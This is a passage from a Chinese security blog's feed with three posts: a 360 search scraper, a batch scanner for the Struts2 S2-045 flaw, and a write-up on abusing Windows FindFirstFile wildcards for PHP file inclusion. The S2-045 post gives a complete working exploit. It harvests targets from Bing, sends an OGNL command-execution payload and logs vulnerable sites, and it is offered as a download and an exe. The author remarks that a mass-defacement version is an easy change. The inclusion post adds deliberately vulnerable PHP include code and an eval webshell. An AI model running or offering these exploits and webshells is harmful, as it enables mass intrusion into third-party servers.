class="comment">#爬取360搜索引擎真实链接，第一个参数关键词str，第二个参数爬取页数int</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse360</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.so.com/s?q='</span> + str(keyword) + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            urls = [unquote(a[<span class="string">'href'</span>][a[<span class="string">'href'</span>].index(<span class="string">'?url='</span>):a[<span class="string">'href'</span>].index(<span class="string">'&amp;q='</span>)][<span class="number">5</span>:]) <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'li.res-list &gt; h3 &gt; a'</span>)]</div><div class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> urls:</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div></pre></td></tr></table></figure>
<p>用法示例:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> parse360(<span class="string">"keyword"</span>,<span class="number">10</span>):</div><div class="line">        <span class="keyword">if</span> url:</div><div class="line">            <span class="keyword">print</span> url</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<h1 id="最后上一张测试图"><a href="#最后上一张测试图" class="headerlink" title="最后上一张测试图"></a>最后上一张测试图</h1><p><img src="https://ooo.0o0.ooo/2017/03/08/58c009f5b3c1d.png" alt="snipaste_20170308_214047.png"></p>
<p><strong>转载请注明出处</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;还是个比较简单的，不像百度有加密算法&lt;/p&gt;
&lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;http://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452&amp;amp;q=inurl%3Anews.do&amp;amp;ts=1488978912&amp;amp;t=89c5361a44fe3f52931d25c6de262bb&amp;amp;src=haosou&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;网址是上面这个样子，没加密直接取就好了，去掉头&lt;code&gt;http://www.so.com/link?url=&lt;/code&gt;和尾&lt;code&gt;&amp;amp;q=&lt;/code&gt;一直到末尾的部分，剩下的就可以吃了&lt;br&gt;
    
    </summary>
    
      <category term="Python" scheme="http://akkuman.coding.me/categories/Python/"/>
    
    
      <category term="Python" scheme="http://akkuman.coding.me/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>s2-045漏洞批量检测工具</title>
    <link href="http://akkuman.coding.me/2017/03/07/st2-045-batch-Test-Tool.html"/>
    <id>http://akkuman.coding.me/2017/03/07/st2-045-batch-Test-Tool.html</id>
    <published>2017-03-07T13:28:53.000Z</published>
    <updated>2017-03-08T12:55:31.778Z</updated>
    
    <content type="html"><![CDATA[<p>今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事</p>
<p>测试图<br><img src="https://ooo.0o0.ooo/2017/03/07/58beb8f48f7df.png" alt="TIM图片20170307212124.png"><br><a id="more"></a></p>
<p><strong>2017-3-8更新</strong></p>
<ul>
<li>增加了对.do关键词的支持，并且支持任何关键词了，之前我只考虑到了.action关键词并且写死了规则，py版本已经更新，<del>win版的exe未更新，需要的自行用pyinstaller打包为exe</del></li>
<li>之前采用whoami如果返回200状态码就判断存在漏洞，但是现在很多已经修复了，导致访问之后依旧会跳到正常页面返回200状态码，于是我改了一下判断，执行命令echo xxxx，如果返回结果中含有xxxx就证明漏洞存在</li>
<li>win版exe已经打包</li>
<li><strong>重要：建议大家都使用py版本，经过群友测试，exe版本对中文关键词的支持不太好，会出现错误，如果使用上有问题可评论</strong></li>
<li><strong>exe版本会出现扫描过慢的情况，强烈建议py版本，鉴于有些朋友说不会配置python环境，我在下面给出了例子</strong></li>
<li><strong>有些朋友说自定义关键字字典出错，这里要提一句，你的字典txt的编码需要是utf-8，有些东西因为写的比较快没考虑太全，见谅</strong><br><img src="https://ooo.0o0.ooo/2017/03/08/58bf96eadc438.png" alt="TIM图片20170308132948.png"></li>
</ul>
<p><strong>依赖包的安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//首先你需要安装一个python，在安装图中记得把有pip的选项和add python to path类似的选项勾选上，然后安装完成后执行python -version和pip</div><div class="line">//如果执行python -version提醒你有问题，试着重启一下cmd或者电脑，或者检查你的path环境变量下有没有python的安装的路径，没有的话就加上</div><div class="line">//如果正常证明环境安装成功，如果执行pip提醒你没有pip，就把你python安装路径下的Scripts目录加到path环境变量，然后在命令行在执行以下代码</div><div class="line">pip install requests</div><div class="line">pip install beautifulsoup4</div></pre></td></tr></table></figure></p>
<p>对于此脚本所放置文件夹下必须有keyword.txt用来存放一行行的关键词<br>最开始是打算直接全部读取然后一个一个跑，不过感觉时间太漫长，测试时间太久<br>后来改成关键词就是自己输入，但是又感觉太麻烦<br>然后就变成了现在的读取关键词然后标号直接输入序号就可以<br>途中遇到了有的网址直接拒绝访问导致报错，还有的超时一直不返回报文，这些都解决了，个人测试的结果还可以，结果保存在一个txt下，至于你想再干些什么，不关我的事情了</p>
<p><strong>说明</strong><br>例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python s2-045.py 9 10</div></pre></td></tr></table></figure></p>
<p>第一个参数是你的文件名，第二个是关键词所对应的序号，第三个是你需要爬行的页数<br>序号与关键词的对应，可以直接运行<code>python s2-045.py</code>就可以产看帮助<br>脚本采用的bing搜索引擎，<strong>文件我会打包在下面</strong></p>
<p>上代码,<strong>python2和3通用</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding:utf-8</span></div><div class="line"><span class="keyword">import</span> sys,requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line">keyword = &#123;&#125;</div><div class="line"><span class="keyword">with</span> open(<span class="string">"keyword.txt"</span>) <span class="keyword">as</span> f:</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> keywordLine <span class="keyword">in</span> f:</div><div class="line">        keyword[str(i)] = keywordLine.strip()</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line">usage = <span class="string">'''</span></div><div class="line">usage : python s2-045.py 0 10</div><div class="line"></div><div class="line">first parameter is your filename</div><div class="line">second parameter is your keyword's number which will be used by Bing</div><div class="line">Third parameter is the page number you want to crawl\n'''</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(actionURL)</span>:</span></div><div class="line">    data = <span class="string">'--447635f88b584ab6b8d9c17d04d79918\</span></div><div class="line">    Content-Disposition: form-data; name="image1"\</div><div class="line">    Content-Type: text/plain; charset=utf-8\</div><div class="line">    \</div><div class="line">    x\</div><div class="line">    --447635f88b584ab6b8d9c17d04d79918--'</div><div class="line">	</div><div class="line">    header = &#123;</div><div class="line">        <span class="string">"Content-Length"</span> : <span class="string">"155"</span>, </div><div class="line">        <span class="string">"User-Agent"</span> : <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>, </div><div class="line">        <span class="string">"Content-Type"</span> : <span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo hereisaexp').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>, </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        request = requests.post(actionURL, data=data, headers=header, timeout = <span class="number">10</span>)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"None"</span>, <span class="string">"Refused"</span></div><div class="line">    <span class="keyword">return</span> request.text, request.status_code</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">returnURLList</span><span class="params">()</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'http://cn.bing.com/search?q='</span> +keyword[sys.argv[<span class="number">1</span>]]+ <span class="string">'&amp;first='</span></div><div class="line">    n =<span class="number">0</span></div><div class="line">    i = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> n &lt; int(sys.argv[<span class="number">2</span>]):</div><div class="line">        baseURL = keywordsBaseURL + str(i)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            req = requests.get(baseURL)</div><div class="line">            soup = BeautifulSoup(req.text, <span class="string">"html.parser"</span>)</div><div class="line">            text = soup.select(<span class="string">'li.b_algo &gt; h2 &gt; a'</span>)</div><div class="line">            <span class="keyword">if</span> <span class="string">'.action'</span> <span class="keyword">in</span> keyword[sys.argv[<span class="number">1</span>]]:</div><div class="line">                standardURL = [url[<span class="string">'href'</span>][:url[<span class="string">'href'</span>].index(<span class="string">'.action'</span>)]+<span class="string">'.action'</span> <span class="keyword">for</span> url <span class="keyword">in</span> text <span class="keyword">if</span> <span class="string">'.action'</span> <span class="keyword">in</span> url[<span class="string">'href'</span>]]</div><div class="line">            <span class="keyword">elif</span> <span class="string">'.do'</span> <span class="keyword">in</span> keyword[sys.argv[<span class="number">1</span>]]:</div><div class="line">                standardURL = [url[<span class="string">'href'</span>][:url[<span class="string">'href'</span>].index(<span class="string">'.do'</span>)]+<span class="string">'.do'</span> <span class="keyword">for</span> url <span class="keyword">in</span> text <span class="keyword">if</span> <span class="string">'.do'</span> <span class="keyword">in</span> url[<span class="string">'href'</span>]]</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                standardURL = [url[<span class="string">'href'</span>] <span class="keyword">for</span> url <span class="keyword">in</span> text]</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            print(<span class="string">"HTTPERROR"</span>)</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        i += <span class="number">10</span></div><div class="line">        n += <span class="number">1</span></div><div class="line">        <span class="keyword">yield</span> standardURL</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</div><div class="line">        print(usage)</div><div class="line">        <span class="keyword">for</span> k,v <span class="keyword">in</span> keyword.items():</div><div class="line">            print(<span class="string">"%s is %s"</span>%(k, v))</div><div class="line">        sys.exit()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> urlList <span class="keyword">in</span> returnURLList():</div><div class="line">        <span class="keyword">for</span> actionURL <span class="keyword">in</span> urlList:</div><div class="line">            text, code = poc(actionURL)</div><div class="line">            <span class="keyword">if</span> <span class="string">'hereisaexp'</span> <span class="keyword">in</span> text:</div><div class="line">                print(str(code) + <span class="string">"----Successful----"</span> + actionURL + <span class="string">'\n'</span>)</div><div class="line">                <span class="keyword">with</span> open(<span class="string">"AvailableURL.txt"</span>,<span class="string">"a"</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(actionURL+<span class="string">'\n'</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                print(str(code)+<span class="string">'----'</span>+actionURL+<span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p><strong><a href="http://file.codecat.one" target="_blank" rel="external">下载地址</a></strong></p>
<p><strong>打包了win版，大家可以直接使用，例如在该exe目录下执行<del>（更新的并未打包出exe，如有需要可以自行用pyinstaller打包）</del></strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s2-045.exe 9 10</div></pre></td></tr></table></figure></p>
<p><strong>其他用法参照上面</strong><br><strong>转载请注明出处</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事&lt;/p&gt;
&lt;p&gt;测试图&lt;br&gt;&lt;img src=&quot;https://ooo.0o0.ooo/2017/03/07/58beb8f48f7df.png&quot; alt=&quot;TIM图片20170307212124.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Windows FindFirstFile利用</title>
    <link href="http://akkuman.coding.me/2017/03/04/Windows-FindFirst-Exploit.html"/>
    <id>http://akkuman.coding.me/2017/03/04/Windows-FindFirst-Exploit.html</id>
    <published>2017-03-04T07:16:27.000Z</published>
    <updated>2017-03-04T07:59:41.623Z</updated>
    
    <content type="html"><![CDATA[<p>目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。</p>
<p>利用方法很简单，我们只要将文件名不可知部分之后的字符用”&lt;”或者”&gt;”代替即可，不过要注意一点是，只使用一个”&lt;”或者”&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求”1&lt;”或者”1&gt;”都是访问不到文件的，需要”1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。<br><a id="more"></a><br>我们来做个简单的测试，测试代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//1.php</span></div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p> 再在同目录下新建一个文件名为”123456.txt”的文件，内容为<code>phpinfo()</code>函数，请求<code>/1.php?file=1&lt;&lt;</code>即可包含。<br> <img src="https://ooo.0o0.ooo/2017/03/04/58ba6a75887a8.png" alt="d8336189e9e8ab752ec855e7ed94a9b7.jpg.png"></p>
<h1 id="常用的漏洞代码"><a href="#常用的漏洞代码" class="headerlink" title="常用的漏洞代码"></a>常用的漏洞代码</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2> <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>($_GET[page]);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>(<span class="string">'./action/'</span> . $_GET[page]);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'./action/show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>(<span class="string">'./action/'</span>. $_GET[page] . <span class="string">'.php'</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'./action/show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h1 id="相关代码："><a href="#相关代码：" class="headerlink" title="相关代码："></a>相关代码：</h1><ol>
<li><p>php中代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>123456.txt中代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> phpinfo() <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>123456.TXT里面可以换成一句话木马，代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">"admin"</span>]) <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
</ol>
<p>url:<a href="http://127.0.0.1/1.php?file=12" target="_blank" rel="external">http://127.0.0.1/1.php?file=12</a>&lt;&lt;<br>密码：admin<br><strong>注意</strong>：txt里面书写php代码不能换行写，最好是在同一行书写【原因待查明】</p>
<p><img src="https://ooo.0o0.ooo/2017/03/04/58ba6bd6354d3.png" alt="acccc1eb9b5be30878b4f979f2edadfc.jpg.png"></p>
<h1 id="windows的文件系统机制引发的PHP路径爆破问题分析"><a href="#windows的文件系统机制引发的PHP路径爆破问题分析" class="headerlink" title="windows的文件系统机制引发的PHP路径爆破问题分析"></a>windows的文件系统机制引发的PHP路径爆破问题分析</h1><h2 id="开场白"><a href="#开场白" class="headerlink" title="开场白"></a>开场白</h2><p>此次所披露的是以下网页中提出的问题所取得的测试结果：</p>
<p><a href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="external">http://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">255</span>; $i++) &#123;</div><div class="line">		$url = <span class="string">'1.ph'</span> . chr($i);</div><div class="line">		$tmp = @file_get_contents($url);</div><div class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($i) . <span class="string">" "</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>已知1.php存在，以上脚本访问的结果是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.php</div><div class="line">1.phP</div><div class="line">1.ph&lt;</div><div class="line">1.ph&gt;</div></pre></td></tr></table></figure></p>
<p>都能得到返回。<br>前两种能返回结果是总所周知的（因为windows的文件系统支持大小的互转的机制），另外的两种返回引起了我们的注意。</p>
<p>测试php版本：PHP4.9,PHP5.2,PHP5.3,PHP6.0</p>
<p>测试系统：WINXP SP3 X32,WINXP SP2 X64，WIN7,WIN2K3</p>
<p>经测试我们得出的结论是：<strong>该漏洞影响所有的windows+php版本</strong></p>
<h2 id="深入探查模糊测试的结果"><a href="#深入探查模糊测试的结果" class="headerlink" title="深入探查模糊测试的结果"></a>深入探查模糊测试的结果</h2><p>为了继续深入探查关于该bug的信息，我们对demo做了些许修改:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">for</span> ($j=<span class="number">0</span>; $i&lt;<span class="number">256</span>; $j++) &#123;</div><div class="line">		<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">256</span>; $i++) &#123;</div><div class="line">			$url = <span class="string">'1.p'</span> . chr($j) . chr($i);</div><div class="line">			$tmp = @file_get_contents($url);</div><div class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($j) . chr($i) . <span class="string">" "</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在调试php解释器的过程中，我们将此“神奇”的漏洞归结为一个Winapi 函数FindFirstFile(）所产生的结果<a href="http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85" target="_blank" rel="external">(http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx)</a>.aspx).更好玩的是，当跟踪函数调用栈的过程中我们发现字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。这在2007年msdn公开的文档中被提及：<a href="http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3</a></p>
<p>但是此bug至今未被任何windows旗下所发行的任何版本修复!</p>
<p>我们要阐明的是，该函数FindFirstFile()在php下的运用远远不至于file_get_contents().关于该bug可以利用的函数我们已经列了如下一表：</p>
<p>此外，我们还发现该利用也可以被运用到c++中，以下采用来自msdn的例子：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">void</span> _tmain(<span class="keyword">int</span> argc, TCHAR *argv[])&#123;</div><div class="line">	WIN32_FIND_DATA FindFileData;</div><div class="line">	HANDLE hFind;</div><div class="line">	<span class="keyword">if</span>( argc != <span class="number">2</span> )&#123;</div><div class="line">		_tprintf(TEXT(<span class="string">"Usage: %s [target_file] "</span>), argv[<span class="number">0</span>]);</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	_tprintf (TEXT(<span class="string">"Target file is %s "</span>), argv[<span class="number">1</span>]);</div><div class="line">	hFind = FindFirstFile(argv[<span class="number">1</span>], &amp;FindFileData);</div><div class="line">	<span class="keyword">if</span> (hFind == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="built_in">printf</span> (<span class="string">"FindFirstFile failed (%d) "</span>, GetLastError());</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		_tprintf (TEXT(<span class="string">"The first file found is %s "</span>), FindFileData.cFileName);</div><div class="line">		FindClose(hFind);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当传入参数”c:o&lt;”时，成功访问到boot.ini文件。</p>
<h2 id="利用方法总结"><a href="#利用方法总结" class="headerlink" title="利用方法总结"></a>利用方法总结</h2><ol>
<li><p>当调用FindFirstFile()函数时，”&lt;”被替换成” <em> ”,这意味该规则可以使”&lt;”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，**为了确保能够使”&lt;”被替换成”</em>”,应当采用”&lt;&lt;”**</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:include(‘shell&lt;&apos;);  或者include(‘shell&lt;&lt;&apos;);    //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。</div></pre></td></tr></table></figure>
</li>
<li><p>当调用FindFirstFile()函数时，”&gt;”被替换成”?”,这意味这”&gt;”可以替换单个任意字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：include(‘shell.p&gt;p&apos;);    //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。</div></pre></td></tr></table></figure>
</li>
<li><p>当调用FindFirstFile()函数时，”””(双引号)被替换成”.”</p>
